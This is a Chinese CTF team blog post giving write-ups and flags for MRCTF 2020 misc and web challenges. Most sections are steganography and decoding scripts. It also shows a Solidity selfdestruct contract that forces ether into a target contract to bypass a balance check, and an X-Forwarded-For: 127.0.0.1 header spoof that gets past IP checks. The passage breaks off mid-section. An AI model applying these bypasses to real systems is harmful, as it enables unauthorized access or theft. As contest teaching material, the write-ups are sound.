<!DOCTYPE html>
<html  lang="zh">
<head>
    <meta charset="utf-8" />

<meta name="generator" content="Hexo 4.2.0" />

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

<title>Merak</title>


    <meta property="og:type" content="website">
<meta property="og:title" content="Merak">
<meta property="og:url" content="https://we.buptmerak.cn/index.html">
<meta property="og:site_name" content="Merak">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://we.buptmerak.cn/images/og_image.png">
<meta property="article:author" content="Merak">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://we.buptmerak.cn/images/og_image.png">





<link rel="alternative" href="/atom.xml" title="Merak" type="application/atom+xml">



<link rel="icon" href="/images/favicon.png">


<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">


    
    
<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>

    
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">

    
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">

    
    
    
    
<link rel="stylesheet" href="/css/back-to-top.css">

    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-1CGE4V1H26"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1CGE4V1H26');
</script>

    
    
    
    
    
    <link rel="stylesheet" href="/css/progressbar.css">
<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
    
    
    


<link rel="stylesheet" href="/css/style.css">
</head>
<body class="is-3-column">
    <nav class="navbar navbar-main">
    <div class="container">
        <div class="navbar-brand is-flex-center">
            <a class="navbar-item navbar-logo" href="/">
            
                <img src="/images/logo.png" alt="Merak" height="28">
            
            </a>
        </div>
        <div class="navbar-menu">
            
            <div class="navbar-start">
                
                <a class="navbar-item is-active"
                href="/">Home</a>
                
                <a class="navbar-item"
                href="/archives">Archives</a>
                
                <a class="navbar-item"
                href="/categories">Categories</a>
                
                <a class="navbar-item"
                href="/tags">Tags</a>
                
            </div>
            
            <div class="navbar-end">
                
                
                
                <a class="navbar-item search" title="搜索" href="javascript:;">
                    <i class="fas fa-search"></i>
                </a>
                
            </div>
        </div>
    </div>
</nav>
    
    <section class="section">
        <div class="container">
            <div class="columns">
                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main">
    
<div class="card">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-04-03T10:35:21.000Z">2020-04-03</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/contest/">contest</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    1 小时 读完 (大约 7228 个字)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/04/03/MRCTF2020/">MRCTF新生赛 2020</a>
            
        </h1>
        <div class="content">
            <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="不眠之夜"><a href="#不眠之夜" class="headerlink" title="不眠之夜"></a>不眠之夜</h3><p>这是一个不能透露出题人信息的题目…<br>解法1：手动拼图（逃<br>解法2：写脚本拼图。通过一些方法（比如边缘的对应像素色差取平方和）计算边缘的相似度，对每个图片对象dfs其四周最相似的图片即可，复杂度(n^3)，2000多像素，常数不大，可以跑。<br>在使用PIL拼图的时候注意生成原图长宽二倍的图片，从中间一点开始扩展，可以保证不会越界。或者检测红色像素点位置，据此构造边缘特征也可以，但这样容易出现多个强连通分量的情况，最后还要手动拼<br>（算法dalao请务必把脚本发来看看<br>解法3：gayhub上的gaps工具。谷歌搜索jigsaw solver可以找到这个工具，两秒就跑出来了。<br>注意其参数<code>-size</code>代表了分割成正方形块的边长。显然应该取小拼图的长宽最大公因数100<br><img src="https://ww1.yunjiexi.club/2020/03/28/mukAD.gif" alt=""></p>
<h3 id="Unravel"><a href="#Unravel" class="headerlink" title="Unravel"></a>Unravel</h3><p>首先拿到后binwalk分离图片发现带有aes的Tokyo<br>然后查看.wav文件尾，发现密文。<br>利用密码解密的得到另一个.wav<br>通过silenteye解LSB隐写<br>得到flag。</p>
<h3 id="飞来横财"><a href="#飞来横财" class="headerlink" title="飞来横财"></a>飞来横财</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;&#x3D;0.6.1;</span><br><span class="line"></span><br><span class="line">contract Modcoin &#123;</span><br><span class="line">    mapping(uint256 &#x3D;&gt; bool) public is_successful;</span><br><span class="line">    function recvpay() public payable &#123;</span><br><span class="line">        require(((msg.value &#x2F; 0.001 ether ) % 2 &#x3D;&#x3D; 0 &amp;&amp; ((msg.value % 0.001 ether) &#x3D;&#x3D; 0)), &quot;Not Accepting These Coins.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function getflag(uint256 target) public &#123;</span><br><span class="line">        require((address(this).balance &#x2F; 0.001 ether ) % 2 &#x3D;&#x3D; 1,&quot;Not Wanted value&quot;);</span><br><span class="line">        require(msg.sender.send(address(this).balance));</span><br><span class="line">        is_successful[target] &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">    fallback () external payable &#123;</span><br><span class="line">        require(((msg.value &#x2F; 0.001 ether ) % 2 &#x3D;&#x3D; 0 &amp;&amp; ((msg.value % 0.001 ether) &#x3D;&#x3D; 0)), &quot;Not Accepting These Coins.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原合约中两个支付函数<code>recvpay()</code> 和 <code>fallback()</code> 都只允许接受偶数倍<code>0.001 ether</code>的付款，而合约的<code>getflag</code>函数则要求奇数倍 <code>0.001 ether</code> 的合约余额才可以执行（并清空合约余额），这时就需要绕过限制向合约地址发送ether，而合约自毁或挖矿产生的ether是无法拒绝的，可以通过以下自毁合约达到条件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract Payassist &#123;</span><br><span class="line">    function destroy_pay(address payable addr) public payable &#123;</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pyflag"><a href="#pyflag" class="headerlink" title="pyflag"></a>pyflag</h3><p>题目灵感：出题人感觉Misc很多题目有着相同的套路，想要尝试基于特征的隐写自动解决工具…于是就有了题目的最后一部分</p>
<p>拿到题目解压缩后发现三张图片。无论是使用strings命令，还是用16进制编辑器打开图片，都可以发现文件末尾隐藏了一些信息。strings会发现[Secret File Part 1-3]的标识，而16进制打开则发现文件尾的结束符并非jpg的标准结束符<code>FF D9</code>。</p>
<p><img src="https://ww1.yunjiexi.club/2020/03/12/cliQk.md.png" alt=""></p>
<p>于是将这三段隐藏信息复制到16进制编辑器中，可以得到一个压缩包。<br>压缩包密码是弱密码1234</p>
<p>然后取得了一个flag.txt，.hint已经提示了使用base16,32,64,85的编码，可以编写自动化脚本来处理，也可以手动尝试。只加密了五层，手动尝试不会很耗费时间。编写py脚本这就需要正则表达式的知识，并掌握这些编码的正则特征。<br>如果你选择编写脚本解码，那么请注意使用的函数传入的参数是str（”Astring”）还是bytes(b”Astring”)。字符流和字节流的区别也很重要，可以去了解一下，明确它们的区别可以让你在数据处理时更加熟练。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baseDec</span><span class="params">(text,type)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b16decode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b32decode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b64decode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b85decode(text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detect</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">"^[0-9A-F=]+$"</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">"^[A-Z2-7=]+$"</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">"^[A-Za-z0-9+/=]+$"</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">autoDec</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b"MRCTF&#123;"</span> <span class="keyword">in</span> text:</span><br><span class="line">            print(<span class="string">"\n"</span>+text.decode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        code = detect(text)</span><br><span class="line">        text = baseDec(text,code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag.txt"</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">autoDec(flag)</span><br></pre></td></tr></table></figure>

<p>顺便给出我的加密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">key = <span class="string">"31214"</span></span><br><span class="line"><span class="comment"># key本来非常长。。似乎太难了改的简单了点</span></span><br><span class="line"><span class="comment"># key = "14332234124133132214311231"</span></span><br><span class="line">flag = <span class="string">b"MRCTF&#123;Y0u_Are_4_p3rFect_dec0der&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baseEnc</span><span class="params">(text,type)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b16encode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b32encode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b85encode(text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baseDec</span><span class="params">(text,type)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b16decode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b32decode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b64decode(text)</span><br><span class="line">    <span class="keyword">elif</span> type == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b85decode(text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finalEnc</span><span class="params">(text,key)</span>:</span></span><br><span class="line">    nf = text</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">        nf = baseEnc(nf,int(i,<span class="number">10</span>))</span><br><span class="line">        <span class="comment">#print("第"+str(count)+"次加密: ",nf)</span></span><br><span class="line">        count +=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> nf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finalDec</span><span class="params">(text,key)</span>:</span></span><br><span class="line">    nf = text</span><br><span class="line">    key = key[::<span class="number">-1</span>]</span><br><span class="line">    print(key)</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">        nf = baseDec(nf,int(i,<span class="number">10</span>))</span><br><span class="line">        <span class="comment">#print("第"+str(count)+"次解密: ",nf)</span></span><br><span class="line">        count +=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> nf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detect</span><span class="params">(text)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">"^[0-9A-F=]+$"</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">"^[A-Z2-7=]+$"</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">"^[A-Za-z0-9+/=]+$"</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">autoDec</span><span class="params">(text)</span>:</span></span><br><span class="line">    print(<span class="string">"dec key:"</span>,end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b"MRCTF&#123;"</span> <span class="keyword">in</span> text:</span><br><span class="line">            print(<span class="string">"\n"</span>+text.decode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        code = detect(text)</span><br><span class="line">        text = baseDec(text,code)</span><br><span class="line">        print(str(code),end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fe = finalEnc(flag,key)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag.txt"</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(fe.decode())</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ff = finalDec(fe,key)</span></span><br><span class="line"><span class="string">print(ff)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">ff = autoDec(fe)</span><br></pre></td></tr></table></figure>

<p>最后flag就是<code>MRCTF{Y0u_Are_4_p3rFect_dec0der}</code></p>
<h3 id="cyberpunk"><a href="#cyberpunk" class="headerlink" title="cyberpunk!"></a>cyberpunk!</h3><p>签到题。<br>改时间或者逆向都行。<br>但是昂哥加了个壳<br>估计大家都会去改时间吧23333。</p>
<h3 id="千层套路-Write-Up"><a href="#千层套路-Write-Up" class="headerlink" title="千层套路 Write Up"></a>千层套路 Write Up</h3><p>主要考察python脚本编写能力</p>
<p>虽然是千层套娃但是为了不那么毒瘤其实只有两层</p>
<p>第一层，自动化解压zip</p>
<p>试几次就知道zip的解压密码都是对应名字，可以写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orginal_zip = <span class="string">"0573.zip"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    tag = orginal_zip</span><br><span class="line">    orginal_zip = zipfile.ZipFile(orginal_zip)</span><br><span class="line">    <span class="keyword">for</span> contents <span class="keyword">in</span> orginal_zip.namelist():</span><br><span class="line">        password = contents[<span class="number">0</span>:contents.find(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">print</span> password</span><br><span class="line">    orginal_zip.setpassword(tag[:<span class="number">-4</span>])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        orginal_zip.extractall()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(len(tag)&gt;<span class="number">6</span>):</span><br><span class="line">        os.system(<span class="string">"rm "</span>+tag)</span><br><span class="line">    orginal_zip=password+<span class="string">".zip"</span></span><br></pre></td></tr></table></figure>

<p>因为博客里有写过相应脚本，这里改了下，解压密码都是对应名字而不是压缩包里名字。有个可能的坑是如果不判断的话，程序跑完会自动把qr.zip也删了</p>
<p>然后第二层就是qr.txt</p>
<p>里面一堆</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(255, 255, 255)</span><br><span class="line">(255, 255, 255)</span><br><span class="line">(255, 255, 255)</span><br><span class="line">(255, 255, 255)</span><br><span class="line">(255, 255, 255)</span><br><span class="line">(255, 255, 255)</span><br><span class="line">(255, 255, 255)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>显然是像素点</p>
<p>用PIL库搞下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">200</span>    <span class="comment">#x坐标  通过对txt里的行数进行整数分</span></span><br><span class="line">y = <span class="number">200</span>    <span class="comment">#y坐标  x * y = 行数</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>, (x, y))</span><br><span class="line">file = open(<span class="string">'qr.txt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, y):</span><br><span class="line">        line = file.readline()  <span class="comment">#获取一行的rgb值</span></span><br><span class="line">        line = line[:<span class="number">-2</span>]</span><br><span class="line">        line = line[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">print</span> line</span><br><span class="line">        rgb = line.split(<span class="string">", "</span>)  <span class="comment">#分离rgb，文本中逗号后面有空格</span></span><br><span class="line">        im.putpixel((i, j), (int(rgb[<span class="number">0</span>]), int(rgb[<span class="number">1</span>]), int(rgb[<span class="number">2</span>])))</span><br><span class="line"></span><br><span class="line">im.save(<span class="string">'flag.png'</span>)</span><br></pre></td></tr></table></figure>

<p>拿到二维码，扫一下拿到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#x3D;&quot;MRCTF&#123;ta01uyout1nreet1n0usandtimes&#125;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a><strong>ezmisc</strong></h3><p>下载附件得到一张png图片，在windows下能打开看到，拖进kali中会显示CRC error，由此可以推断</p>
<p>图片的宽度/高度有问题，又因为图片宽度有问题时在windows下无法正常打开图片，所以本题为图片</p>
<p>高度有问题，修改图片高度即可看到flag：<code>MRCTF{1ts_vEryyyyyy_ez!}</code></p>
<p>附上有关CRC错误的隐写分析网址：<a href="https://www.bbsmax.com/A/gVdnlMVXJW/">https://www.bbsmax.com/A/gVdnlMVXJW/</a></p>
<p>ctfwiki中也有很详细的介绍：<a href="https://ctf-wiki.github.io/ctf-wiki/misc/picture/png-zh/">https://ctf-wiki.github.io/ctf-wiki/misc/picture/png-zh/</a></p>
<h3 id="你能看懂音符吗"><a href="#你能看懂音符吗" class="headerlink" title="你能看懂音符吗"></a>你能看懂音符吗</h3><p>下载附件，解压时报错，放进winhex查看，发现rar文件头错误，将<code>6152</code>修改为<code>5261</code>后再解压，即</p>
<p>可得到一个word文档，打开后发现内容被隐藏，搜索word隐写可知其隐写方式，将被隐藏的内容显</p>
<p>示出来，得到一串音符，在线网址解密音符即可得到flag</p>
<p>word隐写方式（供参考）：<a href="https://blog.csdn.net/q_l_s/article/details/53813971">https://blog.csdn.net/q_l_s/article/details/53813971</a></p>
<p>解密网址：<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue</a></p>
<p>flag：<code>MRCTF{thEse_n0tes_ArE_am@zing~}</code></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h3><p>一道简单的前端trick题目，希望更多人注意到前端验证是不安全的。</p>
<p>首先过一遍业务逻辑，是购买授权码，再验证授权码的过程。自然想到审计验证过程的漏洞。点击按钮弹出窗口是js控制的，进而猜测验证逻辑处于前端，于是查看源代码发现逻辑如下:</p>
<p><img src="https://ww1.yunjiexi.club/2020/03/12/cixcz.png" alt=""></p>
<p>不知道MD5？事实上我们根本不需要理会前端的验证，只需要直接跳转到flag.php即可。<br>（md5(“ARandomString”)）</p>
<p>进入flag.php，题目告诉我们只有特定的IP才能访问，并且是后端验证。事实上，应用层使用XFF验证IP也是没有意义的。PHP使用X-Forward-For这个http的请求头来验证，而这个请求头我们可以伪造。</p>
<p>我们不知道购买者的IP，但是知道“自己”的IP，也就是本地环回地址<code>127.0.0.1</code>。因此只需要用抓包软件抓到HTTP的请求包，进行修改（加入<code>X-Forwarded-For: 127.0.0.1</code>一行）就可以欺骗过验证逻辑。<br>最后的flag字体我调成了白色hhh 所以要多观察源代码<br>后端的验证逻辑一般如下：</p>
